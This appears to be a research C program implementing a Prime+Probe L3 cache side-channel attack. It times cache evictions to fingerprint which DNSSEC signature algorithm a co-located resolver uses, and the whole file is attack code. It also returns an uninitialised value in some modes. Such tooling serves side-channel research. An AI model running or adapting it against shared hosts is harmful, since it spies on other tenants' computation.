/*
 * cache_probe.c - Prime+Probe attack on L3 cache for DNSSEC algorithm fingerprinting
 *
 * This tool demonstrates cache-based side-channel attack on DNSSEC validation.
 * It uses Prime+Probe technique on shared L3 cache to detect which algorithm
 * (RSA/ECDSA/Ed25519) was used for signature verification by a co-located resolver.
 *
 * Architecture:
 *   - Allocates a buffer sized to cover L3 cache sets
 *   - Prime: Fill cache sets with attacker-controlled data
 *   - Trigger: Victim performs DNSSEC validation (via trigger_attack.py)
 *   - Probe: Measure access latency to detect evictions
 *
 * Compilation: gcc -O2 -o cache_probe cache_probe.c -lpthread
 * Usage: ./cache_probe [--prime-only | --probe-only | --rounds N] [--cache-size KB] [--output file.csv]
 *
 * Author: DNSSEC Timing Research
 * License: Research use only
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <getopt.h>

/* Configuration */
#define DEFAULT_CACHE_SIZE_KB (8 * 1024)  /* 8 MB L3 cache typical */
#define CACHE_LINE_SIZE 64
#define PAGE_SIZE 4096
#define DEFAULT_ROUNDS 1000
#define MAX_CACHE_SETS 65536
#define THRESHOLD_CYCLES 120  /* Cache hit/miss threshold */

/* Prime+Probe state */
typedef struct {
    uint8_t *buffer;           /* Allocated buffer covering cache */
    size_t buffer_size;        /* Total buffer size in bytes */
    size_t num_cache_lines;    /* Number of cache lines to probe */
    uint64_t *timing_results;  /* Per-probe timing results */
    int rounds;                /* Number of measurement rounds */
    int threshold;             /* Hit/miss threshold in cycles */
} probe_state_t;

/* Read timestamp counter */
static inline uint64_t rdtsc(void) {
    unsigned int lo, hi;
    __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

/* Serialized read (prevents reordering) */
static inline uint64_t rdtscp(void) {
    unsigned int lo, hi, aux;
    __asm__ __volatile__ ("rdtscp" : "=a" (lo), "=d" (hi), "=c" (aux));
    __asm__ __volatile__ ("mfence" ::: "memory");
    return ((uint64_t)hi << 32) | lo;
}

/* Flush cache line */
static inline void clflush(volatile void *p) {
    __asm__ __volatile__ ("clflush (%0)" :: "r" (p));
    __asm__ __volatile__ ("mfence" ::: "memory");
}

/* Memory fence */
static inline void mfence(void) {
    __asm__ __volatile__ ("mfence" ::: "memory");
}

/* Allocate buffer covering L3 cache */
static int allocate_buffer(probe_state_t *state, size_t cache_size_kb) {
    state->buffer_size = cache_size_kb * 1024;
    state->buffer = (uint8_t *)aligned_alloc(PAGE_SIZE, state->buffer_size);
    if (!state->buffer) {
        perror("aligned_alloc");
        return -1;
    }

    /* Touch all pages to ensure allocation */
    memset(state->buffer, 0x42, state->buffer_size);
    state->num_cache_lines = state->buffer_size / CACHE_LINE_SIZE;

    state->timing_results = (uint64_t *)calloc(state->num_cache_lines, sizeof(uint64_t));
    if (!state->timing_results) {
        perror("calloc");
        free(state->buffer);
        return -1;
    }

    printf("[*] Allocated %zu KB buffer (%zu cache lines)\n",
           cache_size_kb, state->num_cache_lines);
    return 0;
}

/* Prime: fill all cache sets */
static void prime_cache(probe_state_t *state) {
    volatile uint8_t *ptr = state->buffer;
    size_t i;

    /* Stride through buffer to cover all cache sets */
    /* Use page-sized strides to hit different sets */
    for (i = 0; i < state->num_cache_lines; i++) {
        /* Access to bring into cache */
        volatile uint8_t val = ptr[i * CACHE_LINE_SIZE];
        (void)val;
    }
    mfence();
}

/* Probe: measure access latency for each cache line */
static void probe_cache(probe_state_t *state) {
    volatile uint8_t *ptr = state->buffer;
    uint64_t start, end;
    size_t i;

    for (i = 0; i < state->num_cache_lines; i++) {
        start = rdtsc();
        volatile uint8_t val = ptr[i * CACHE_LINE_SIZE];
        (void)val;
        end = rdtscp();

        state->timing_results[i] = end - start;
    }
}

/* Wait for trigger file to appear */
static int wait_for_trigger(const char *trigger_file) {
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 1000000; /* 1ms poll interval */

    while (1) {
        if (access(trigger_file, F_OK) == 0) {
            return 1;
        }
        nanosleep(&ts, NULL);
    }
    return 0;
}

/* Signal completion by writing file */
static void signal_completion(const char *done_file) {
    FILE *f = fopen(done_file, "w");
    if (f) {
        fprintf(f, "done");
        fclose(f);
    }
}

/* Run a single Prime+Probe round */
static void run_round(probe_state_t *state) {
    /* Prime: fill cache */
    prime_cache(state);

    /* Memory barrier to ensure prime completes */
    mfence();

    /* Probe: measure evictions */
    probe_cache(state);
}

/* Output timing vector to CSV */
static void output_results_csv(probe_state_t *state, FILE *out, int round, const char *label) {
    size_t i;
    fprintf(out, "%d,%s", round, label);
    for (i = 0; i < state->num_cache_lines; i += 64) {
        /* Output every 64th line to reduce CSV size */
        fprintf(out, ",%lu", state->timing_results[i]);
    }
    fprintf(out, "\n");
}

/* Output summary statistics */
static void output_summary(probe_state_t *state, FILE *out) {
    size_t i;
    uint64_t sum = 0, min = UINT64_MAX, max = 0;
    size_t miss_count = 0;

    for (i = 0; i < state->num_cache_lines; i++) {
        sum += state->timing_results[i];
        if (state->timing_results[i] < min) min = state->timing_results[i];
        if (state->timing_results[i] > max) max = state->timing_results[i];
        if (state->timing_results[i] > (uint64_t)state->threshold) miss_count++;
    }

    fprintf(out, "\n--- Summary ---\n");
    fprintf(out, "Cache lines probed: %zu\n", state->num_cache_lines);
    fprintf(out, "Mean latency: %.1f cycles\n", (double)sum / state->num_cache_lines);
    fprintf(out, "Min latency: %lu cycles\n", min);
    fprintf(out, "Max latency: %lu cycles\n", max);
    fprintf(out, "Misses (>%d cycles): %zu (%.1f%%)\n",
            state->threshold, miss_count,
            100.0 * miss_count / state->num_cache_lines);
}

/* Calibrate threshold based on cache hit/miss timing */
static uint64_t calibrate_threshold(probe_state_t *state) {
    uint64_t hit_times[256];
    uint64_t miss_times[256];
    int i;
    uint64_t hit_avg = 0, miss_avg = 0;

    printf("[*] Calibrating cache hit/miss threshold...\n");

    /* Measure hit times (access cached data) */
    prime_cache(state);
    for (i = 0; i < 256; i++) {
        uint64_t start = rdtsc();
        volatile uint8_t val = state->buffer[i * CACHE_LINE_SIZE];
        (void)val;
        uint64_t end = rdtscp();
        hit_times[i] = end - start;
        hit_avg += hit_times[i];
    }
    hit_avg /= 256;

    /* Measure miss times (flush then access) */
    for (i = 0; i < 256; i++) {
        clflush(&state->buffer[i * CACHE_LINE_SIZE]);
    }
    mfence();
    for (i = 0; i < 256; i++) {
        uint64_t start = rdtsc();
        volatile uint8_t val = state->buffer[i * CACHE_LINE_SIZE];
        (void)val;
        uint64_t end = rdtscp();
        miss_times[i] = end - start;
        miss_avg += miss_times[i];
    }
    miss_avg /= 256;

    /* Threshold is midpoint */
    uint64_t threshold = (hit_avg + miss_avg) / 2;
    printf("[*] Hit avg: %lu cycles, Miss avg: %lu cycles, Threshold: %lu cycles\n",
           hit_avg, miss_avg, threshold);

    return threshold;
}

/* Main attack measurement loop */
static int run_attack(probe_state_t *state, const char *trigger_file,
                      const char *done_file, const char *label, FILE *csv_out) {
    int round;

    printf("[*] Starting attack: %d rounds, label='%s'\n", state->rounds, label);
    printf("[*] Trigger file: %s\n", trigger_file);
    printf("[*] Done file: %s\n", done_file);

    /* Write CSV header */
    if (csv_out) {
        fprintf(csv_out, "round,label");
        for (size_t i = 0; i < state->num_cache_lines; i += 64) {
            fprintf(csv_out, ",cache_%zu", i);
        }
        fprintf(csv_out, "\n");
    }

    for (round = 0; round < state->rounds; round++) {
        /* Signal ready */
        signal_completion(done_file);

        /* Wait for trigger */
        if (!wait_for_trigger(trigger_file)) {
            printf("[-] Failed to receive trigger\n");
            return -1;
        }

        /* Small delay to let victim start validation */
        usleep(100);

        /* Run Prime+Probe round */
        run_round(state);

        /* Output results */
        if (csv_out) {
            output_results_csv(state, csv_out, round, label);
        }

        /* Remove trigger for next round */
        unlink(trigger_file);

        if ((round + 1) % 100 == 0) {
            printf("[*] Completed %d/%d rounds\n", round + 1, state->rounds);
        }
    }

    printf("[*] Attack complete: %d rounds\n", round);
    return 0;
}

/* Standalone mode: just measure cache timing without coordination */
static int run_standalone(probe_state_t *state, const char *label, FILE *csv_out) {
    int round;

    printf("[*] Standalone mode: %d rounds, label='%s'\n", state->rounds, label);

    /* Write CSV header */
    if (csv_out) {
        fprintf(csv_out, "round,label");
        for (size_t i = 0; i < state->num_cache_lines; i += 64) {
            fprintf(csv_out, ",cache_%zu", i);
        }
        fprintf(csv_out, "\n");
    }

    for (round = 0; round < state->rounds; round++) {
        /* Run Prime+Probe round */
        run_round(state);

        /* Output results */
        if (csv_out) {
            output_results_csv(state, csv_out, round, label);
        }

        if ((round + 1) % 100 == 0) {
            printf("[*] Completed %d/%d rounds\n", round + 1, state->rounds);
        }
    }

    printf("[*] Standalone complete: %d rounds\n", round);
    return 0;
}

/* Print usage */
static void print_usage(const char *prog) {
    printf("Usage: %s [options]\n", prog);
    printf("\nOptions:\n");
    printf("  -c, --cache-size KB    L3 cache size in KB (default: %d)\n", DEFAULT_CACHE_SIZE_KB);
    printf("  -r, --rounds N         Number of measurement rounds (default: %d)\n", DEFAULT_ROUNDS);
    printf("  -t, --threshold CYCLES Cache hit/miss threshold (default: auto-calibrate)\n");
    printf("  -o, --output FILE      CSV output file\n");
    printf("  -l, --label LABEL      Label for this measurement (e.g., 'rsa', 'ecdsa')\n");
    printf("  -p, --prime-only       Only run prime phase\n");
    printf("  -g, --probe-only       Only run probe phase\n");
    printf("  --trigger FILE         Trigger file for synchronization\n");
    printf("  --done FILE            Done file for synchronization\n");
    printf("  -s, --standalone       Run without trigger synchronization\n");
    printf("  -h, --help             Show this help\n");
    printf("\nExamples:\n");
    printf("  %s -r 1000 -l rsa -o rsa_timings.csv\n", prog);
    printf("  %s --trigger /tmp/trigger --done /tmp/done -l ecdsa\n", prog);
}

int main(int argc, char *argv[]) {
    probe_state_t state;
    memset(&state, 0, sizeof(state));

    /* Default values */
    state.rounds = DEFAULT_ROUNDS;
    state.threshold = THRESHOLD_CYCLES;

    /* Options */
    static struct option long_options[] = {
        {"cache-size", required_argument, 0, 'c'},
        {"rounds", required_argument, 0, 'r'},
        {"threshold", required_argument, 0, 't'},
        {"output", required_argument, 0, 'o'},
        {"label", required_argument, 0, 'l'},
        {"prime-only", no_argument, 0, 'p'},
        {"probe-only", no_argument, 0, 'g'},
        {"trigger", required_argument, 0, 1000},
        {"done", required_argument, 0, 1001},
        {"standalone", no_argument, 0, 's'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };

    int cache_size_kb = DEFAULT_CACHE_SIZE_KB;
    char *output_file = NULL;
    char *label = "baseline";
    char *trigger_file = "/tmp/cache_trigger";
    char *done_file = "/tmp/cache_done";
    int prime_only = 0;
    int probe_only = 0;
    int standalone = 1;
    int opt;

    while ((opt = getopt_long(argc, argv, "c:r:t:o:l:pgsh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'c':
                cache_size_kb = atoi(optarg);
                break;
            case 'r':
                state.rounds = atoi(optarg);
                break;
            case 't':
                state.threshold = atoi(optarg);
                break;
            case 'o':
                output_file = optarg;
                break;
            case 'l':
                label = optarg;
                break;
            case 'p':
                prime_only = 1;
                break;
            case 'g':
                probe_only = 1;
                break;
            case 1000:
                trigger_file = optarg;
                standalone = 0;
                break;
            case 1001:
                done_file = optarg;
                break;
            case 's':
                standalone = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    /* Pin to CPU core for consistent cache behavior */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) == 0) {
        printf("[*] Pinned to CPU core 0\n");
    }

    /* Allocate buffer */
    if (allocate_buffer(&state, cache_size_kb) != 0) {
        return 1;
    }

    /* Calibrate threshold if not specified */
    if (state.threshold == THRESHOLD_CYCLES) {
        state.threshold = calibrate_threshold(&state);
    }
    printf("[*] Using threshold: %d cycles\n", state.threshold);

    /* Open output file */
    FILE *csv_out = NULL;
    if (output_file) {
        csv_out = fopen(output_file, "w");
        if (!csv_out) {
            perror("fopen");
            free(state.buffer);
            free(state.timing_results);
            return 1;
        }
        printf("[*] Output: %s\n", output_file);
    }

    /* Run measurement */
    int ret;
    if (prime_only) {
        printf("[*] Prime-only mode\n");
        prime_cache(&state);
        printf("[*] Cache primed\n");
    } else if (probe_only) {
        printf("[*] Probe-only mode\n");
        probe_cache(&state);
        output_summary(&state, stdout);
    } else if (standalone) {
        ret = run_standalone(&state, label, csv_out);
    } else {
        ret = run_attack(&state, trigger_file, done_file, label, csv_out);
    }

    /* Cleanup */
    if (csv_out) fclose(csv_out);
    free(state.buffer);
    free(state.timing_results);

    return ret;
}
